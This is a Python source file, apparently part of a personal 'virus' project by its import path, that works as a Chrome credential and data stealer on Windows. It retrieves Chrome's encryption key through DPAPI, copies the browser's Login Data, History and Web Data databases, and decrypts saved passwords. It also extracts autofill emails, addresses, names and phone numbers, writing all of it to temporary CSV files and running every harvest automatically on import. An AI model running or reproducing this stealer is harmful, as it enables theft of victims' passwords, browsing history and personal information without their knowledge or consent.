import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from tempfile import TemporaryFile
from datetime import datetime, timedelta
import csv
from re import sub
import logging
from sys import path
path.insert(1, r'D:\Code\Python\Virus Stuff\myVIRUS\final test\Second All Around Draft\myVirus')
from logfile import *
CURRENT_DIR = os.path.dirname(os.path.realpath(__file__))

logfile_dir = logging_file.name
logging.basicConfig(level=logging.DEBUG, 
        format='%(asctime)s | %(name)s | %(levelname)s |: %(message)s',
        datefmt='%m/%d %I:%M %p',
        handlers=[logging.FileHandler(logging_file.name), logging.StreamHandler()])

chromedata_logger = logging.getLogger('chromedata')
logindata_logger = logging.getLogger("logindata")
webdata_logger = logging.getLogger("webdata")
historydata_logger = logging.getLogger("historydata")

try:
    chromedata_logger.debug("Attempting to generate data files")
    CHROME_WEBDATA_FILE = TemporaryFile(mode='w', delete=False, suffix='.csv', newline='')
    CHROME_LOGINDATA_FILE = TemporaryFile(mode='w', delete=False, suffix='.csv', newline='')
    CHROME_HISTORYDATA_FILE = TemporaryFile(mode='w', delete=False, suffix='.csv', newline='')
except Exception:
    chromedata_logger.critical("UNABLE TO CREATE TEMPORARY FILES, closing application...")
    exit()
   
logindata_csv_writer = csv.writer(CHROME_LOGINDATA_FILE)
logindata_csv_writer.writerow(["CHROME LOGIN DATA \n URL, USERNAME, PASSWORD, CREATION-DATE, LAST-ACCESSED"])

historydata_csv_writer = csv.writer(CHROME_HISTORYDATA_FILE)
historydata_csv_writer.writerow(str(["CHROME HISTORY \n TITLE, URL, LAST-ACCESSED"]))

webdata_csv_writer = csv.writer(CHROME_WEBDATA_FILE)

def chrome_datetime_convert(date):
    return datetime(1601, 1, 1) + timedelta(microseconds=date)
 
def get_encryption_key():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
    except FileNotFoundError:
        logindata_logger.critical("Encryption key not found")
        return None
    finally:
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def determine_empty(item):
    if isinstance(item, tuple):
        if not all(item) == True:
            return True
        return False

def convert_tuple_to_string(unformatted_list, formatted_list):
    for index in unformatted_list:
        formatted_list.append(index[0])

def save_encrypted_data(data_filename, new_file, execute_command):
    
    if get_encryption_key() == None:
        if execute_command == "logindata":
            logindata_logger.critical("Passwords unable to be retrieved, no encryption key.")
            return None
    key = get_encryption_key()
    try:
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", data_filename)
    except FileNotFoundError:
        ""
    shutil.copyfile(db_path, new_file)
    db = sqlite3.connect(new_file)
    cursor = db.cursor()

    if execute_command == "history":
        cursor.execute("select title, url, last_visit_time from urls order by last_visit_time")
    elif execute_command == "logindata":
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    else:

            user_emails = ['EMAILS']
            user_address = ['ADDRESS']
            user_full_name = ['FULL NAME']
            user_phone_number = ['PHONE NUMBERS']
            unformatted_user_emails = cursor.execute("select email from autofill_profile_emails").fetchall()
            unformatted_user_emails[:] = [x for x in unformatted_user_emails if not determine_empty(x)]
            convert_tuple_to_string(unformatted_user_emails, user_emails)
    
            unformatted_user_address = cursor.execute("select street_address, city, state, zip_code from autofill_profile_addresses").fetchall()
            unformatted_user_address[:] = [x for x in unformatted_user_address if not determine_empty(x)]
            convert_tuple_to_string(unformatted_user_address, user_address)
    
            unformatted_user_full_name = cursor.execute("select full_name from autofill_profile_names").fetchall()
            unformatted_user_full_name[:] = [x for x in unformatted_user_full_name if not determine_empty(x)] 
            convert_tuple_to_string(unformatted_user_full_name, user_full_name)
    
    
            user_phone_numbers = cursor.execute("select number from autofill_profile_phones").fetchall()
            user_phone_numbers[:] = [x for x in user_phone_numbers if not determine_empty(x)]
            for phone_numbers in user_phone_numbers:
                first_index = phone_numbers[0]
                first_index = sub('[)( -]', '', first_index)
                user_phone_number.append(first_index)
            
    history_record_count = 0
    logindata_entry_count= 0
    webdata_entry_count = 0
    for row in cursor.fetchall():
        
        if execute_command == "history":
            historydata_csv_writer.writerow([row[0].encode('utf8').decode('ascii', 'ignore'), row[1].encode('utf8').decode('ascii', 'ignore'), {str(chrome_datetime_convert(row[2]))}])
            history_record_count+=1
        elif execute_command == "logindata":
            if row[2] or decrypt_password(row[3], key):
                logindata_csv_writer.writerow([row[0], row[2], decrypt_password(row[3], key), {str(chrome_datetime_convert(row[4]))}, {str(chrome_datetime_convert(row[5]))}])
                logindata_entry_count+=1
    if execute_command == "webdata":
        webdata_csv_writer.writerow(user_emails)
        webdata_csv_writer.writerow(user_phone_number)
        webdata_csv_writer.writerow(user_full_name)
        webdata_csv_writer.writerow(user_address)
    cursor.close()
    db.close()

    try:
        os.remove(new_file)
    except:
        pass
save_encrypted_data("Login Data", "LoginData.db", "logindata")
save_encrypted_data("History", "History.db", "history")
save_encrypted_data("Web Data", "WebData.db", "webdata")